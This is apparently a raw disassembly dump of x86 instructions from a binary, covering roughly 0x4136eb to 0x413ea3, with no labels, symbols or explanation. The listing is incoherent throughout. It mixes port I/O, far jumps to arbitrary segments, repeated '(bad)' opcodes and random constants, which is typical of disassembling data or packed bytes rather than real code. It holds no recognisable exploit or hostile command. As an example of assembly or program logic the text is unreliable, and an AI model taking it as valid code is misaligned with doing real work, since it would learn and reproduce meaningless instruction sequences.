  4136eb:	aad    0x78
  4136ed:	inc    esi
  4136ee:	inc    edx
  4136ef:	mov    ch,0x1d
  4136f1:	out    0xb7,eax
  4136f3:	adc    BYTE PTR ds:0x1556733a,bh
  4136f9:	lahf   
  4136fa:	jnp    0x413694
  4136fc:	pause  
  4136fe:	add    al,0x5
  413700:	fs out 0x85,eax
  413703:	fst    QWORD PTR [ebx]
  413705:	or     BYTE PTR [esi],ch
  413707:	loop   0x413757
  413709:	cli    
  41370a:	in     eax,dx
  41370b:	pop    ecx
  41370c:	xor    al,0x13
  41370e:	pop    edi
  41370f:	jo     0x4136bb
  413711:	pop    ebp
  413712:	push   esi
  413713:	std    
  413714:	xor    bh,BYTE PTR [edi]
  413716:	inc    ebp
  413717:	pop    esp
  413718:	outs   dx,BYTE PTR ds:[esi]
  413719:	int    0xbf
  41371b:	mov    al,ds:0x50820541
  413720:	enter  0x86ed,0x49
  413724:	push   edi
  413725:	mov    bh,0x49
  413727:	in     al,0x6d
  413729:	ret    
  41372a:	int3   
  41372b:	mov    cl,0xa1
  41372d:	cdq    
  41372e:	fisub  DWORD PTR [edx]
  413730:	xchg   DWORD PTR [eax-0x72522e29],edx
  413736:	push   ecx
  413737:	and    al,0x7a
  413739:	fwait
  41373a:	pop    esi
  41373b:	adc    esi,DWORD PTR [eax+edi*4]
  41373e:	clc    
  41373f:	jge    0x4136f1
  413741:	jmp    0xe711:0xe83e8207
  413748:	mov    dh,0x85
  41374a:	test   eax,0x8f43cefa
  41374f:	jmp    0x8cff1a6d
  413754:	cmp    esp,DWORD PTR [edi]
  413756:	out    0xf,al
  413758:	aad    0xde
  41375a:	rcl    dl,1
  41375c:	test   DWORD PTR [ebp+eax*1+0x73],edx
  413760:	sbb    BYTE PTR [esi+0x5deaf726],cl
  413766:	ins    BYTE PTR es:[edi],dx
  413767:	cwde   
  413768:	xchg   edx,eax
  413769:	mov    BYTE PTR [ebx-0x48fb125a],0x82
  413770:	push   es
  413771:	aas    
  413772:	(bad)  
  413776:	xchg   edx,eax
  413777:	arpl   di,dx
  413779:	dec    BYTE PTR [ebp+0x1b]
  41377c:	mov    dl,0xe9
  41377e:	(bad)  
  413780:	dec    esp
  413781:	adc    ebp,DWORD PTR [ebx+0x467bb0c]
  413787:	inc    ebp
  413788:	xchg   edi,eax
  413789:	and    edx,ebp
  41378b:	xchg   DWORD PTR [ecx+0x75],esp
  41378e:	mov    edx,0x7bca6943
  413793:	int3   
  413794:	adc    bh,BYTE PTR [eax-0x21251dfb]
  41379a:	lahf   
  41379b:	in     eax,dx
  41379c:	mov    DWORD PTR [edi-0x5ba29311],ebp
  4137a2:	adc    BYTE PTR [ebp+0x3de88847],0xc5
  4137a9:	cmp    DWORD PTR [edx-0x50cdb329],esp
  4137af:	cmc    
  4137b0:	lods   al,BYTE PTR ds:[esi]
  4137b1:	pop    eax
  4137b2:	xlat   BYTE PTR ds:[ebx]
  4137b3:	adc    bl,al
  4137b5:	inc    ebp
  4137b6:	outs   dx,BYTE PTR ds:[esi]
  4137b7:	(bad)  
  4137b8:	cld    
  4137b9:	mov    dl,dh
  4137bb:	ins    BYTE PTR es:[edi],dx
  4137bc:	fist   WORD PTR [ecx]
  4137be:	hlt    
  4137bf:	mov    al,cs:0xe95b5771
  4137c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137c6:	xlat   BYTE PTR ds:[ebx]
  4137c7:	lods   al,BYTE PTR ds:[esi]
  4137c8:	sbb    DWORD PTR [ebx-0x452b043],ebp
  4137ce:	sub    dl,BYTE PTR [ecx+0x5341a41b]
  4137d4:	ss mov bh,0x67
  4137d7:	(bad)  
  4137d8:	rcr    ch,cl
  4137da:	ret    
  4137db:	fcom   DWORD PTR [eax+0x4d342bd4]
  4137e1:	(bad)  
  4137e2:	mov    al,ds:0x49f3a14c
  4137e7:	sub    cl,bh
  4137e9:	sbb    edi,DWORD PTR [edi]
  4137eb:	cs or  al,0xaf
  4137ee:	sbb    esi,eax
  4137f0:	and    esi,DWORD PTR [ecx+0xb6d1fb5]
  4137f6:	stos   DWORD PTR es:[edi],eax
  4137f7:	mov    ds:0x303bd04c,al
  4137fc:	pusha  
  4137fd:	jno    0x413873
  4137ff:	mov    al,0xb8
  413801:	hlt    
  413802:	jae    0x413878
  413804:	sbb    al,0x1a
  413806:	mov    bl,ah
  413808:	jae    0x4137f9
  41380a:	int3   
  41380b:	cs repnz leave 
  41380e:	out    0xe6,al
  413810:	inc    esi
  413811:	pushf  
  413812:	jge    0x4137fb
  413814:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413815:	push   esi
  413816:	mov    ah,0x4a
  413818:	adc    eax,0xb721e07b
  41381d:	leavew 
  41381f:	dec    edx
  413820:	push   ss
  413821:	test   al,0xc9
  413823:	push   eax
  413824:	xchg   edi,eax
  413825:	aam    0x88
  413827:	push   cs
  413828:	addr16 iret 
  41382a:	jno    0x41384c
  41382c:	cld    
  41382d:	rol    DWORD PTR [edx+0x7b753041],1
  413833:	cwde   
  413834:	imul   DWORD PTR [edi]
  413836:	mov    WORD PTR [edx-0x11ed3dc7],ds
  41383c:	fild   DWORD PTR [eax-0x25]
  41383f:	pop    es
  413840:	pop    ecx
  413841:	outs   dx,DWORD PTR ds:[esi]
  413842:	mov    al,0x11
  413844:	cld    
  413845:	(bad)  
  413846:	cmp    bh,BYTE PTR [ebx+0x78e98704]
  41384c:	push   0x5d
  41384e:	mov    dh,0x7
  413850:	xor    dl,BYTE PTR [esi+ebx*1+0x26]
  413854:	std    
  413855:	(bad)  
  413857:	in     eax,0xf5
  413859:	or     ebx,ebx
  41385b:	addr16 jno 0x4138c6
  41385e:	xchg   BYTE PTR [esi+0x7d69a79a],dh
  413864:	adc    al,0x6d
  413866:	mov    esp,DWORD PTR [ebp-0x4ad7601d]
  41386c:	dec    edi
  41386d:	push   ecx
  41386e:	(bad)  
  41386f:	dec    ebp
  413870:	jecxz  0x4138a9
  413872:	push   ebp
  413873:	adc    edx,DWORD PTR [edx-0x1]
  413876:	repnz (bad) 
  413878:	mov    ebx,0xc8197c29
  41387d:	jae    0x413820
  41387f:	rol    BYTE PTR [edx+0x24217810],1
  413885:	in     al,dx
  413886:	stc    
  413887:	jecxz  0x4138df
  413889:	in     eax,0x9d
  41388b:	test   BYTE PTR [edi-0x7c3e8985],dh
  413891:	or     ch,BYTE PTR [eax-0xb]
  413894:	sbb    DWORD PTR [edx-0x16],0xffffff87
  413898:	aaa    
  413899:	pop    ebp
  41389a:	int    0x91
  41389c:	cmp    al,0xfe
  41389e:	xor    edi,DWORD PTR [edx+ebx*1+0x3b049dc8]
  4138a5:	rcr    BYTE PTR [edi+0x58],0x56
  4138a9:	dec    ebx
  4138aa:	sub    ah,BYTE PTR [esi+0x3ef7ff30]
  4138b0:	fnsave [si]
  4138b3:	inc    ebp
  4138b4:	div    BYTE PTR [eax+0x533d986c]
  4138ba:	clc    
  4138bb:	or     DWORD PTR [esi-0x5],esi
  4138be:	push   ecx
  4138bf:	mov    dh,0xb5
  4138c1:	jmp    0xd0f0fe19
  4138c6:	adc    eax,0x2b56d1a9
  4138cb:	lock push 0xac62792a
  4138d1:	pusha  
  4138d2:	jb     0x41385a
  4138d4:	fstp   QWORD PTR [esi+0x63]
  4138d7:	scas   eax,DWORD PTR es:[edi]
  4138d8:	test   eax,0x56623876
  4138dd:	add    al,0x6
  4138df:	aas    
  4138e0:	mov    eax,ds:0x3f5a44
  4138e5:	push   esp
  4138e6:	cld    
  4138e7:	push   ebp
  4138e8:	scas   eax,DWORD PTR es:[edi]
  4138e9:	inc    DWORD PTR [ecx+0x23]
  4138ec:	cmp    ch,cl
  4138ee:	stos   DWORD PTR es:[edi],eax
  4138ef:	js     0x41395c
  4138f1:	cwde   
  4138f2:	push   ebp
  4138f3:	enter  0x3f10,0x2a
  4138f7:	and    dl,BYTE PTR [ebx]
  4138f9:	pop    ebp
  4138fa:	leave  
  4138fb:	push   ecx
  4138fc:	in     al,0xcd
  4138fe:	pop    esp
  4138ff:	std    
  413900:	pop    esp
  413901:	xor    DWORD PTR [edx+0x3d759d27],esi
  413907:	inc    eax
  413908:	call   0x50c2:0x15bb459
  41390f:	xor    eax,0x4d9c783d
  413914:	inc    ecx
  413915:	jmp    0xfeca1170
  41391a:	mov    ds:0x597e4eec,al
  41391f:	cmp    DWORD PTR [edi+eax*2],esp
  413922:	dec    edi
  413923:	scas   eax,DWORD PTR es:[edi]
  413924:	fst    DWORD PTR [ebp+0x69]
  413927:	and    DWORD PTR [eax-0x2f],ecx
  41392a:	push   ebp
  41392b:	bound  ebx,QWORD PTR [esp+ebp*8-0x5ea0da8e]
  413932:	mov    WORD PTR [ecx+edi*4+0x20269d19],gs
  413939:	adc    eax,0x510a0534
  41393e:	loop   0x4138dd
  413940:	loope  0x4138ec
  413942:	xor    al,0x1d
  413944:	pop    ecx
  413945:	add    BYTE PTR [edi-0x659e31a8],ah
  41394b:	outs   dx,BYTE PTR ds:[esi]
  41394c:	jo     0x413960
  41394e:	mov    ecx,0x12add522
  413953:	xor    DWORD PTR [esi],edx
  413955:	add    ah,dl
  413957:	arpl   si,ax
  413959:	push   0x21
  41395b:	call   0xcfeeaef0
  413960:	shl    BYTE PTR [ebx],1
  413962:	das    
  413963:	jbe    0x413943
  413965:	push   esp
  413966:	mov    ebp,0x8b7451b7
  41396b:	(bad)  
  41396c:	loope  0x413960
  41396e:	test   eax,0xc82b7c82
  413973:	dec    eax
  413974:	ds leave 
  413976:	xor    eax,0x4f1cfed4
  41397b:	ins    DWORD PTR es:[edi],dx
  41397c:	sbb    al,BYTE PTR [ecx-0x5ac8c381]
  413982:	jo     0x4139c2
  413984:	call   0x3a3d:0xd7ad67eb
  41398b:	int    0xec
  41398d:	(bad)  
  41398f:	push   eax
  413990:	push   ecx
  413991:	sbb    eax,0xe6c29880
  413996:	add    al,0x2
  413998:	imul   edi,DWORD PTR [edi+eiz*4],0x61
  41399c:	jns    0x413a19
  41399e:	loopne 0x413959
  4139a0:	aad    0x64
  4139a2:	repnz (bad) 
  4139a4:	jmp    0x301f:0x559668d
  4139ab:	daa    
  4139ac:	(bad)  
  4139ad:	aad    0xab
  4139af:	pop    edi
  4139b0:	pop    ebp
  4139b1:	test   DWORD PTR [edx],ebp
  4139b3:	push   edi
  4139b4:	and    ah,BYTE PTR [eax+0x31]
  4139b7:	dec    eax
  4139b8:	mov    bh,0x79
  4139ba:	jmp    0x78d4:0x6c0f0618
  4139c1:	xchg   BYTE PTR [esi],dh
  4139c3:	imul   edx,eax,0x519fae4b
  4139c9:	mov    ebx,0x74d21e98
  4139ce:	sub    al,0x62
  4139d0:	les    esp,FWORD PTR [ecx-0x4f2d45]
  4139d6:	cs std 
  4139d8:	jmp    0xfbf28c16
  4139dd:	icebp  
  4139de:	sub    al,0x1f
  4139e0:	aaa    
  4139e1:	sbb    ch,bl
  4139e3:	jge    0x4139bd
  4139e5:	icebp  
  4139e6:	inc    eax
  4139e7:	and    DWORD PTR [eax+edi*1+0x25],edi
  4139eb:	lea    ebp,[edi]
  4139ed:	push   ebp
  4139ee:	test   esp,ecx
  4139f0:	out    dx,al
  4139f1:	repz loope 0x4139fc
  4139f4:	sahf   
  4139f5:	test   BYTE PTR [esi-0x73286695],0xc8
  4139fc:	dec    ecx
  4139fd:	sbb    BYTE PTR [ebx],dl
  4139ff:	push   ebp
  413a00:	jmp    0x413a63
  413a02:	nop
  413a03:	stos   BYTE PTR es:[edi],al
  413a04:	xchg   edx,eax
  413a05:	xchg   ebx,eax
  413a06:	cmp    eax,DWORD PTR [edx+0x3a329765]
  413a0c:	xor    BYTE PTR [edi+0x5d961abf],cl
  413a12:	or     edx,DWORD PTR [ebx]
  413a14:	ja     0x413a52
  413a16:	or     BYTE PTR [ebx-0x4c4f9cb4],bl
  413a1c:	inc    eax
  413a1d:	push   edx
  413a1e:	add    esp,edi
  413a20:	(bad)  
  413a21:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  413a23:	stos   DWORD PTR es:[edi],eax
  413a24:	fbstp  TBYTE PTR [ecx+0x61218b0e]
  413a2a:	lods   al,BYTE PTR ds:[esi]
  413a2b:	mov    ecx,0x2425b1ce
  413a30:	add    esp,DWORD PTR [edx]
  413a32:	stc    
  413a33:	mov    eax,DWORD PTR [ebp-0x3a]
  413a36:	push   0x7
  413a38:	in     eax,dx
  413a39:	int3   
  413a3a:	lea    edx,ds:0x2dc0c0fb
  413a40:	call   0xe9ce:0xf727bea4
  413a47:	and    edx,DWORD PTR [eax+0x44]
  413a4a:	retf   0x5372
  413a4d:	lahf   
  413a4e:	lods   eax,DWORD PTR ds:[esi]
  413a4f:	add    eax,0x518f7db8
  413a54:	sbb    eax,0x9d1f26a1
  413a59:	add    DWORD PTR [edi+0x7f],0x37
  413a5d:	test   al,0x3b
  413a5f:	and    eax,0xd4768546
  413a64:	xor    eax,0x5a50979a
  413a69:	sbb    ecx,DWORD PTR [eax+0x2c]
  413a6c:	sahf   
  413a6d:	xlat   BYTE PTR ds:[ebx]
  413a6e:	inc    esp
  413a6f:	push   esp
  413a70:	push   0x43be2a8c
  413a75:	or     eax,0xb60aa5ca
  413a7a:	push   ebp
  413a7b:	das    
  413a7c:	or     ch,dl
  413a7e:	dec    ebp
  413a7f:	jnp    0x413ad4
  413a81:	ds push esi
  413a83:	(bad)  
  413a84:	neg    BYTE PTR [ebx+0x6a399048]
  413a8a:	hlt    
  413a8b:	mov    DWORD PTR [esp+edi*4],esp
  413a8e:	in     al,0xd8
  413a90:	leave  
  413a91:	lea    esi,[eax]
  413a93:	sbb    dl,ah
  413a95:	and    cl,BYTE PTR ds:0x4a2e7f68
  413a9b:	sbb    al,cl
  413a9d:	sahf   
  413a9e:	ret    0x7469
  413aa1:	or     dl,BYTE PTR ds:0x4c023245
  413aa7:	xor    ch,BYTE PTR [ebp+0x6585bd0e]
  413aad:	es (bad) 
  413aaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ab0:	xchg   BYTE PTR [ecx-0x626ba568],dh
  413ab6:	mov    ecx,ebx
  413ab8:	sub    eax,0x2bb5ed4
  413abd:	push   ebp
  413abe:	fst    QWORD PTR [ecx+0x2d4a6ab9]
  413ac4:	push   ebx
  413ac5:	jnp    0x413a9d
  413ac7:	(bad)  
  413ac8:	push   cs
  413ac9:	sbb    al,0x3
  413acb:	or     DWORD PTR [ecx-0x19],edx
  413ace:	mov    ?,edi
  413ad0:	cdq    
  413ad1:	dec    ebx
  413ad2:	in     al,dx
  413ad3:	add    edi,DWORD PTR ds:0x2190e197
  413ad9:	and    eax,0xb5a8e91a
  413ade:	adc    esi,edi
  413ae0:	pop    ss
  413ae1:	push   ebx
  413ae2:	clc    
  413ae3:	fistp  WORD PTR [ebx+0x13cecd9f]
  413ae9:	imul   edx
  413aeb:	ss loope 0x413a6e
  413aee:	and    eax,0x34ab0083
  413af3:	lock jg 0x413b49
  413af6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413af7:	test   al,0xe5
  413af9:	scas   al,BYTE PTR es:[edi]
  413afa:	cli    
  413afb:	test   ch,dh
  413afd:	or     ecx,DWORD PTR [eax-0x48dc9ff]
  413b03:	or     dh,BYTE PTR [ebx]
  413b05:	mov    al,0x5d
  413b07:	mov    esi,0x570b8b35
  413b0c:	sti    
  413b0d:	lds    eax,FWORD PTR [edi]
  413b0f:	lea    ecx,[edi-0x4]
  413b12:	imul   esi,DWORD PTR [ebp-0x29ea898b],0xa05cec0d
  413b1c:	cli    
  413b1d:	inc    ebx
  413b1e:	cmp    cl,BYTE PTR [esi+ebp*4+0x3a]
  413b22:	fistp  DWORD PTR [eax-0x4fd13cc]
  413b28:	pop    eax
  413b29:	test   al,0x35
  413b2b:	test   BYTE PTR [ecx+0x1e],cl
  413b2e:	scas   eax,DWORD PTR es:[edi]
  413b2f:	xor    BYTE PTR [ebx],0x14
  413b32:	cmp    dh,bl
  413b34:	jecxz  0x413ac8
  413b36:	fistp  DWORD PTR [edx+0xbfd7a22]
  413b3c:	bound  ecx,QWORD PTR [edi+ecx*4-0x1b]
  413b40:	je     0x413b5a
  413b42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b43:	xor    BYTE PTR [edx-0x2f51838d],cl
  413b49:	adc    BYTE PTR [ebx+0x31],al
  413b4c:	jmp    0x93ca:0xc7a71442
  413b53:	push   esp
  413b54:	fs test al,0x2d
  413b57:	addr16 loope 0x413add
  413b5a:	add    BYTE PTR [ebx+0x3f0aca39],0x47
  413b61:	mov    esi,0x5b2a52d1
  413b66:	xchg   ecx,eax
  413b67:	data16 mov WORD PTR [edx+0xe],?
  413b6b:	ins    DWORD PTR es:[edi],dx
  413b6c:	stos   DWORD PTR es:[edi],eax
  413b6d:	sub    BYTE PTR [edx],dh
  413b6f:	mov    cs,esp
  413b71:	cmp    BYTE PTR [ebx+0x67973eb],0xae
  413b78:	and    dl,BYTE PTR [eax]
  413b7a:	inc    esi
  413b7b:	push   edi
  413b7c:	lods   eax,DWORD PTR ds:[esi]
  413b7d:	into   
  413b7e:	sub    dl,BYTE PTR [esi-0xf]
  413b81:	mov    bl,cl
  413b83:	in     eax,0xb2
  413b85:	ja     0x413bf4
  413b87:	mov    ch,0x76
  413b89:	push   edi
  413b8a:	ror    bh,0x85
  413b8d:	pop    esi
  413b8e:	jns    0x413b2c
  413b90:	jno    0x413bff
  413b92:	sub    ebx,DWORD PTR ds:0x3e97b32b
  413b98:	outs   dx,BYTE PTR ds:[esi]
  413b99:	mov    ebx,0x2a238e09
  413b9e:	mov    al,0x9f
  413ba0:	push   edx
  413ba1:	sub    BYTE PTR [edi+ecx*8+0x74],bl
  413ba5:	jle    0x413b99
  413ba7:	cmp    eax,DWORD PTR [ebp-0x17bdf1a5]
  413bad:	fs mov esp,0xdd5a95fd
  413bb3:	sub    eax,0x5fc1ff9
  413bb8:	push   edi
  413bb9:	cwde   
  413bba:	(bad)  
  413bbb:	enter  0x8e59,0x45
  413bbf:	push   eax
  413bc0:	es mov esp,0xfa3813c2
  413bc6:	out    dx,al
  413bc7:	lods   eax,DWORD PTR ds:[esi]
  413bc8:	xchg   esp,eax
  413bc9:	loope  0x413c10
  413bcb:	jb     0x413b5e
  413bcd:	outs   dx,BYTE PTR ds:[esi]
  413bce:	mov    dh,0xa
  413bd0:	mov    dh,0xaa
  413bd2:	das    
  413bd3:	mov    ecx,0x1c45e212
  413bd8:	cmp    ch,BYTE PTR [eax]
  413bda:	push   ss
  413bdb:	out    dx,eax
  413bdc:	mov    bh,0xf5
  413bde:	sbb    al,0x2b
  413be0:	in     eax,dx
  413be1:	std    
  413be2:	aas    
  413be3:	sub    dh,cl
  413be5:	adc    DWORD PTR [ebx],ebx
  413be7:	sub    DWORD PTR [edx],eax
  413be9:	inc    eax
  413bea:	cmp    bh,cl
  413bec:	mov    eax,ds:0x3dfc1cc5
  413bf1:	loopne 0x413c44
  413bf3:	adc    edi,DWORD PTR [ebp-0x72]
  413bf6:	iret   
  413bf7:	push   ecx
  413bf8:	dec    edi
  413bf9:	jp     0x413c47
  413bfb:	inc    edx
  413bfc:	fwait
  413bfd:	ret    0xb3ef
  413c00:	sub    eax,0x5ce55805
  413c05:	lock mov eax,0xe83f31a7
  413c0b:	cmp    BYTE PTR [edx-0x4262a94],ah
  413c11:	aad    0x3c
  413c13:	sbb    esi,DWORD PTR [ebp+0x2365e29]
  413c19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c1a:	ds xchg edx,eax
  413c1c:	mov    DWORD PTR [edx+0x52f36148],esi
  413c22:	retf   
  413c23:	test   DWORD PTR [ebx+0x6e],edx
  413c26:	aad    0x8c
  413c28:	je     0x413c4d
  413c2a:	clc    
  413c2b:	jbe    0x413bde
  413c2d:	dec    edx
  413c2e:	icebp  
  413c2f:	bnd jb 0x413ca8
  413c32:	out    0xd5,eax
  413c34:	shr    BYTE PTR [ecx-0x64a28bc9],cl
  413c3a:	mov    eax,ds:0xcd653364
  413c3f:	jae    0x413c99
  413c41:	imul   eax,DWORD PTR [ecx],0x3c
  413c44:	jae    0x413cac
  413c46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c47:	jp     0x413bff
  413c49:	jle    0x413c3d
  413c4b:	add    eax,0x72f692bb
  413c50:	adc    DWORD PTR [esi+ebx*2],edx
  413c53:	fsub   st(3),st
  413c55:	sub    eax,0x372be083
  413c5a:	inc    eax
  413c5b:	inc    ecx
  413c5c:	push   esp
  413c5d:	adc    BYTE PTR [ecx],dh
  413c5f:	hlt    
  413c60:	push   edi
  413c61:	dec    DWORD PTR [ebx-0x33e6ab37]
  413c67:	test   BYTE PTR [ebp-0x46ad1c6a],ch
  413c6d:	cmp    ebp,DWORD PTR [ebx+0x75ae901d]
  413c73:	(bad)  
  413c74:	jns    0x413c3c
  413c76:	xor    al,0x5a
  413c78:	mov    ch,0xd8
  413c7a:	pop    edi
  413c7b:	push   cs
  413c7c:	clc    
  413c7d:	push   0x2a
  413c7f:	sbb    BYTE PTR [eax],ch
  413c81:	dec    eax
  413c82:	popf   
  413c83:	aad    0xbb
  413c85:	jne    0x413c2d
  413c87:	or     al,BYTE PTR [ebx]
  413c89:	dec    edi
  413c8a:	and    al,0xf9
  413c8c:	lahf   
  413c8d:	and    cl,BYTE PTR [eax+0xf]
  413c90:	xchg   esp,eax
  413c91:	and    ch,BYTE PTR [eax+0x3daf6eaf]
  413c97:	aas    
  413c98:	dec    eax
  413c99:	(bad)  
  413c9b:	inc    edi
  413c9c:	mov    WORD PTR [ebp-0x25],gs
  413c9f:	fdiv   QWORD PTR [ecx]
  413ca1:	add    DWORD PTR ds:0xd75f2c58,eax
  413ca7:	add    ecx,DWORD PTR [ecx+0x24]
  413caa:	mov    ch,0x8
  413cac:	ins    BYTE PTR es:[edi],dx
  413cad:	dec    eax
  413cae:	call   0x61ac:0x2daf6c73
  413cb5:	ins    BYTE PTR es:[edi],dx
  413cb6:	shr    DWORD PTR [esi-0x3f1524b5],cl
  413cbc:	leave  
  413cbd:	or     al,0xed
  413cbf:	in     al,0x91
  413cc1:	push   esi
  413cc2:	or     al,0x62
  413cc4:	lods   al,BYTE PTR ds:[esi]
  413cc5:	lahf   
  413cc6:	add    DWORD PTR [edx-0x12af1bd5],eax
  413ccc:	pminsw mm7,QWORD PTR [edi-0x44]
  413cd0:	shr    DWORD PTR [edi],1
  413cd2:	push   ecx
  413cd3:	stos   DWORD PTR es:[edi],eax
  413cd4:	inc    ebx
  413cd5:	(bad)  
  413cd7:	pop    edi
  413cd8:	enter  0x2855,0x5
  413cdc:	mov    bl,0xbb
  413cde:	mov    edi,0x886a0089
  413ce3:	cli    
  413ce4:	mov    dh,BYTE PTR [ebx]
  413ce6:	jno    0x413caa
  413ce8:	fistp  DWORD PTR [esi-0x19]
  413ceb:	jmp    0xa407b993
  413cf0:	mov    al,0x6b
  413cf2:	mov    DWORD PTR [esi+eax*2],esi
  413cf5:	adc    edx,DWORD PTR [edi+0x1]
  413cf8:	cwde   
  413cf9:	rol    BYTE PTR gs:[ebp+0x2249ca20],0x0
  413d01:	call   0x12931baa
  413d06:	pop    edi
  413d07:	xor    esi,DWORD PTR ds:0xf86e325a
  413d0d:	and    esp,ebp
  413d0f:	addr16 mov cl,0x18
  413d12:	pop    ecx
  413d13:	inc    esp
  413d14:	ret    0x5f85
  413d17:	mov    bl,0xb2
  413d19:	ret    
  413d1a:	jb     0x413d75
  413d1c:	pop    esi
  413d1d:	pop    edx
  413d1e:	scas   eax,DWORD PTR es:[edi]
  413d1f:	scas   eax,DWORD PTR es:[edi]
  413d20:	retf   
  413d21:	jb     0x413cee
  413d23:	mov    ?,WORD PTR [eax]
  413d25:	fs or  eax,0x40da1658
  413d2b:	push   0x30d55438
  413d30:	mov    ecx,0x9f08d356
  413d35:	jg     0x413d3f
  413d37:	push   esi
  413d38:	pop    eax
  413d39:	std    
  413d3a:	add    BYTE PTR [esi-0x61],ch
  413d3d:	sbb    DWORD PTR [edi-0x78],eax
  413d40:	out    0x2e,eax
  413d42:	pop    esi
  413d43:	nop
  413d44:	es mov cl,0x3b
  413d47:	mov    eax,0x76bdfdfe
  413d4c:	pop    ebp
  413d4d:	shl    BYTE PTR [edi+ebx*1+0x8],1
  413d51:	test   esi,ebx
  413d53:	adc    BYTE PTR [esi],cl
  413d55:	scas   al,BYTE PTR es:[edi]
  413d56:	repnz cld 
  413d58:	fist   DWORD PTR [ebp-0x1e]
  413d5b:	sti    
  413d5c:	or     ebp,DWORD PTR [ecx-0x12ec24f7]
  413d62:	and    BYTE PTR [esi],bh
  413d64:	push   ds
  413d65:	xchg   esi,eax
  413d66:	lods   al,BYTE PTR ds:[esi]
  413d67:	jle    0x413dd4
  413d69:	nop
  413d6a:	lahf   
  413d6b:	and    al,0x8c
  413d6d:	mov    WORD PTR [eax+0xbcabbb4],gs
  413d73:	icebp  
  413d74:	or     eax,0x1ddaa75e
  413d79:	(bad)  
  413d7a:	and    al,0x66
  413d7c:	pop    es
  413d7d:	mov    ah,0x6a
  413d7f:	dec    ebx
  413d80:	fld    TBYTE PTR [esi+0x12]
  413d83:	xchg   ebx,eax
  413d84:	sbb    eax,0x8a53af1d
  413d89:	pop    esi
  413d8a:	adc    ah,BYTE PTR ds:0x6ef9ddc
  413d90:	mov    dh,BYTE PTR [edx-0x39]
  413d93:	or     ch,BYTE PTR [ebp-0x7c1e70f8]
  413d99:	ins    DWORD PTR es:[edi],dx
  413d9a:	pcmpgtb mm4,QWORD PTR [edi+0x543bba67]
  413da1:	(bad)  
  413da2:	icebp  
  413da3:	test   DWORD PTR [ebx-0x23],ebx
  413da6:	adc    BYTE PTR [ebx-0x69],al
  413da9:	jmp    0xe519c5e0
  413dae:	or     al,0x2
  413db0:	push   cs
  413db1:	pop    esp
  413db2:	or     BYTE PTR [edx+0x33bdd083],ah
  413db8:	pop    edx
  413db9:	std    
  413dba:	mov    eax,ds:0xad7b19a7
  413dbf:	mov    eax,0xb7f4cde1
  413dc4:	cmp    al,0xb6
  413dc6:	xchg   edi,eax
  413dc7:	xor    DWORD PTR [edx+0x5e],edx
  413dca:	mov    eax,0x304f5812
  413dcf:	dec    ebx
  413dd0:	dec    eax
  413dd1:	dec    ecx
  413dd2:	sub    DWORD PTR [edx+0x66283b8d],eax
  413dd8:	and    cl,BYTE PTR [ebp+0x1f15f5af]
  413dde:	inc    edx
  413ddf:	adc    BYTE PTR [ebx-0x4845337d],cl
  413de5:	mov    cl,BYTE PTR [esi-0x798a41ab]
  413deb:	pushf  
  413dec:	mov    esi,0x57f15d7a
  413df1:	xchg   edi,eax
  413df2:	sbb    al,0x60
  413df4:	or     al,al
  413df6:	jnp    0x413e08
  413df8:	push   es
  413df9:	fnstsw WORD PTR [edx+esi*4]
  413dfc:	mov    ecx,0x9a829b67
  413e01:	jnp    0x413e4c
  413e03:	sbb    edi,DWORD PTR ds:0x6373064a
  413e09:	and    DWORD PTR [ebx+ecx*2-0x30],ebp
  413e0d:	cdq    
  413e0e:	aaa    
  413e0f:	inc    edx
  413e10:	es leave 
  413e12:	inc    DWORD PTR [eax-0x1db4763e]
  413e18:	and    ebp,esp
  413e1a:	pop    esi
  413e1b:	in     al,0x28
  413e1d:	rcl    DWORD PTR [eax-0x5d],cl
  413e20:	sbb    eax,0xa99db6e2
  413e25:	and    al,0xf3
  413e27:	cmp    al,0xc5
  413e29:	lods   eax,DWORD PTR ds:[esi]
  413e2a:	test   al,0x3e
  413e2c:	fcomp  QWORD PTR [edi]
  413e2e:	mov    ah,0x8e
  413e30:	add    ecx,esp
  413e32:	inc    edx
  413e33:	mov    al,0x6b
  413e35:	adc    bl,dl
  413e37:	sbb    al,0x73
  413e39:	inc    edx
  413e3a:	cdq    
  413e3b:	xor    eax,0x98f50034
  413e40:	je     0x413e6e
  413e42:	xchg   esi,eax
  413e43:	test   BYTE PTR [ebx-0x3ec4c8a5],bh
  413e49:	data16 fdiv QWORD PTR [edx]
  413e4c:	push   edi
  413e4d:	fcmovne st,st(6)
  413e4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e50:	bound  ebx,QWORD PTR [ecx]
  413e52:	add    DWORD PTR [esi+eax*2+0x31],eax
  413e56:	popw   es
  413e58:	xor    DWORD PTR [ebx],ebx
  413e5a:	lea    eax,[esi-0x62328c9]
  413e60:	push   esi
  413e61:	cmp    cl,cl
  413e63:	sbb    al,0x2e
  413e65:	xor    eax,0xcc52a1
  413e6a:	or     DWORD PTR [edi],eax
  413e6c:	int    0xf1
  413e6e:	out    dx,al
  413e6f:	mov    dl,0x74
  413e71:	aam    0xb5
  413e73:	pop    ebx
  413e74:	bound  ecx,QWORD PTR [edx+0xcdbe686]
  413e7a:	pushf  
  413e7b:	dec    bl
  413e7d:	repz push edx
  413e7f:	(bad)  
  413e80:	aaa    
  413e81:	push   ss
  413e82:	out    0x70,eax
  413e84:	aas    
  413e85:	mov    edi,esp
  413e87:	les    ebx,FWORD PTR [eax]
  413e89:	mov    dl,BYTE PTR [edi]
  413e8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e8c:	xchg   ebp,eax
  413e8d:	mov    al,0x9c
  413e8f:	into   
  413e90:	push   0x7a
  413e92:	inc    eax
  413e93:	scas   al,BYTE PTR es:[edi]
  413e94:	push   ebx
  413e95:	in     al,0xd3
  413e97:	lahf   
  413e98:	xchg   ebp,eax
  413e99:	xchg   esi,eax
  413e9a:	push   ss
  413e9b:	adc    BYTE PTR [eax-0x7ba66a4d],dl
  413ea1:	sar    BYTE PTR [edi],1
  413ea3:	adc    BYTE PTR [ebp+0x41],ah
